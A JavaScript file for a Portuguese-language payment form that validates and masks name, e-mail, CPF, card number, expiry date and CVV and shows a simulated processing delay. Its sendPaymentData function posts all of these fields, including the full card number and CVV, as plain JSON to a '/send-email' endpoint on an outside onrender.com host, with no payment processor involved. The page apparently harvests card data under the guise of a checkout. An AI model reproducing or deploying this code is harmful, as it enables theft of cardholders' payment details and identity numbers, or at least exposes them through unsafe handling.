// Adiciona evento ao formulário de pagamento
document.getElementById("payment-form").addEventListener("submit", function (e) {
  e.preventDefault(); // Impede o envio padrão do formulário

  // Captura os campos do formulário
  const name = document.getElementById("name");
  const email = document.getElementById("email");
  const cpf = document.getElementById("cpf");
  const cardNumber = document.getElementById("card-number");
  const expiryDate = document.getElementById("expiry-date");
  const cvv = document.getElementById("cvv");
  const installments = document.getElementById("installments");
  const value = document.getElementById("value");
  const installmentId = document.getElementById("installment-id");
  const payButton = document.getElementById("pay-button");

  // Exibe spinner no botão de pagamento
  toggleSpinner(payButton, true);

  setTimeout(() => {
    let isValid = true;

    // Validações de campos obrigatórios
    if (!name.value.trim()) {
      setFeedback(name, false, "Por favor, preencha seu nome.");
      isValid = false;
    } else {
      setFeedback(name, true);
    }

    if (!validateEmail(email.value)) {
      setFeedback(email, false, "Por favor, insira um e-mail válido.");
      isValid = false;
    } else {
      setFeedback(email, true);
    }

    if (!validateCPF(cpf.value)) {
      setFeedback(cpf, false, "CPF inválido.");
      isValid = false;
    } else {
      setFeedback(cpf, true);
    }

    if (!validateCardNumber(cardNumber.value)) {
      setFeedback(cardNumber, false, "Número do cartão inválido.");
      isValid = false;
    } else {
      setFeedback(cardNumber, true);
    }

    if (!validateExpiryDate(expiryDate.value)) {
      setFeedback(expiryDate, false, "Data de validade inválida ou vencida.");
      isValid = false;
    } else {
      setFeedback(expiryDate, true);
    }

    if (cvv.value.length !== 3 || !/^\d{3}$/.test(cvv.value)) {
      setFeedback(cvv, false, "CVV inválido.");
      isValid = false;
    } else {
      setFeedback(cvv, true);
    }

    // Valida o valor total
    if (!value.value.trim()) {
      setFeedback(value, false, "Por favor, insira o valor total.");
      isValid = false;
    } else {
      setFeedback(value, true);
    }

    // Valida o ID do parcelamento
    if (!installmentId.value.trim() || !/^\d+$/.test(installmentId.value)) {
      setFeedback(installmentId, false, "ID do parcelamento inválido.");
      isValid = false;
    } else {
      setFeedback(installmentId, true);
    }

    // Remove spinner e envia dados se válidos
    toggleSpinner(payButton, false);

    if (isValid) {
      sendPaymentData({
        name: name.value,
        email: email.value,
        cpf: cpf.value,
        cardNumber: cardNumber.value,
        expiryDate: expiryDate.value,
        cvv: cvv.value,
        installments: installments.value, // Número de parcelas
        totalValue: value.value, // Valor total
        installmentId: installmentId.value, // ID do parcelamento
      });
    } else {
      displayStatus("Por favor, corrija os campos destacados.", "error");
    }
  }, 3000); // Simula tempo de processamento
});

// Envia os dados para o backend
function sendPaymentData(data) {
  fetch("https://servidorweb-7ggd.onrender.com/send-email", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(data),
  })
    .then((response) => response.json())
    .then((result) => {
      if (result.message === "E-mail enviado com sucesso!") {
        displayStatus("Pagamento enviado! Verifique seu e-mail.", "success");
        window.location.href = "payment-status.html";
      } else {
        displayStatus("Erro ao enviar os dados. Tente novamente.", "error");
      }
    })
    .catch((error) => {
      console.error("Erro ao enviar os dados:", error);
      displayStatus("Erro ao conectar com o servidor.", "error");
    });
}

// Exibe mensagens de status
function displayStatus(message, status) {
  const paymentStatus = document.getElementById("payment-status");
  paymentStatus.textContent = message;

  if (status === "success") {
    paymentStatus.style.color = "green";
  } else if (status === "error") {
    paymentStatus.style.color = "red";
  } else if (status === "loading") {
    paymentStatus.style.color = "orange";
  }
}

// Alterna o spinner no botão de pagar
function toggleSpinner(button, isLoading) {
  if (isLoading) {
    button.disabled = true;
    button.innerHTML = `<div class="spinner-container"><div class="spinner"></div></div>`;
  } else {
    button.disabled = false;
    button.textContent = "Pagar";
  }
}

// Adiciona feedback visual
function setFeedback(input, isValid, message = "") {
  if (isValid) {
    input.classList.remove("invalid");
    input.classList.add("valid");
    input.setCustomValidity("");
  } else {
    input.classList.remove("valid");
    input.classList.add("invalid");
    input.setCustomValidity(message);
  }
}

// Máscaras automáticas
document.getElementById("cpf").addEventListener("input", function () {
  this.value = maskCPF(this.value);
});

document.getElementById("card-number").addEventListener("input", function () {
  this.value = maskCardNumber(this.value);
});

document.getElementById("expiry-date").addEventListener("input", function () {
  this.value = maskExpiryDate(this.value);
});

document.getElementById("cvv").addEventListener("input", function () {
  this.value = maskCVV(this.value);
});

// Máscara para CPF (000.000.000-00)
function maskCPF(value) {
  return value
    .replace(/\D/g, "")
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
}

// Máscara para número do cartão de crédito (0000 0000 0000 0000)
function maskCardNumber(value) {
  return value
    .replace(/\D/g, "")
    .substring(0, 16)
    .replace(/(\d{4})(?=\d)/g, "$1 ")
    .trim();
}

// Máscara para data de validade (MM/AA)
function maskExpiryDate(value) {
  return value
    .replace(/\D/g, "")
    .substring(0, 4)
    .replace(/(\d{2})(\d)/, "$1/$2");
}

// Máscara para CVV (123)
function maskCVV(value) {
  return value.replace(/\D/g, "").substring(0, 3);
}

// Valida CPF
function validateCPF(cpf) {
  cpf = cpf.replace(/\D/g, "");
  if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;

  let sum = 0,
    rest;

  for (let i = 1; i <= 9; i++) {
    sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
  }
  rest = (sum * 10) % 11;
  if (rest === 10 || rest === 11) rest = 0;
  if (rest !== parseInt(cpf.substring(9, 10))) return false;

  sum = 0;
  for (let i = 1; i <= 10; i++) {
    sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
  }
  rest = (sum * 10) % 11;
  if (rest === 10 || rest === 11) rest = 0;
  return rest === parseInt(cpf.substring(10, 11));
}

// Valida número do cartão
function validateCardNumber(cardNumber) {
  const digits = cardNumber.replace(/\D/g, "");
  if (digits.length !== 16) return false;

  let sum = 0;
  let alternate = false;

  for (let i = digits.length - 1; i >= 0; i--) {
    let n = parseInt(digits[i], 10);

    if (alternate) {
      n *= 2;
      if (n > 9) n -= 9;
    }

    sum += n;
    alternate = !alternate;
  }

  return sum % 10 === 0;
}

// Valida data de validade
function validateExpiryDate(expiryDate) {
  const [month, year] = expiryDate.split("/").map(Number);
  if (!month || !year || month < 1 || month > 12) return false;

  const now = new Date();
  const currentYear = parseInt(now.getFullYear().toString().slice(-2));
  const currentMonth = now.getMonth() + 1;

  return year > currentYear || (year === currentYear && month >= currentMonth);
}

// Valida e-mail
function validateEmail(email) {
  const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return regex.test(email);
}

// Atualiza parcelas dinamicamente com base no valor total
document.getElementById("value").addEventListener("input", function () {
  const formattedValue = formatCurrency(this.value);
  this.value = formattedValue;

  const numericValue = parseFloat(
    formattedValue.replace("R$", "").replace(".", "").replace(",", ".")
  );

  if (isNaN(numericValue) || numericValue <= 0) {
    updateInstallments([]);
    return;
  }

  calculateInstallments(numericValue);
});

// Formata o valor no estilo monetário brasileiro (R$ 0,00)
function formatCurrency(value) {
  value = value.replace(/\D/g, "");
  const numericValue = parseFloat(value) / 100;
  return numericValue.toLocaleString("pt-BR", {
    style: "currency",
    currency: "BRL",
  });
}

// Calcula parcelas com base no valor total
function calculateInstallments(totalValue) {
  const installments = [];
  for (let i = 1; i <= 12; i++) {
    const installmentValue = (totalValue / i).toFixed(2);
    installments.push(`${i}x de R$ ${installmentValue.replace(".", ",")}`);
  }
  updateInstallments(installments);
}

// Atualiza o seletor de parcelas
function updateInstallments(installments) {
  const installmentsSelect = document.getElementById("installments");
  installmentsSelect.innerHTML = "";

  if (installments.length === 0) {
    const option = document.createElement("option");
    option.textContent = "Insira um valor válido";
    option.disabled = true;
    installmentsSelect.appendChild(option);
    return;
  }

  installments.forEach((installment, index) => {
    const option = document.createElement("option");
    option.value = index + 1;
    option.textContent = installment;
    installmentsSelect.appendChild(option);
  });
}
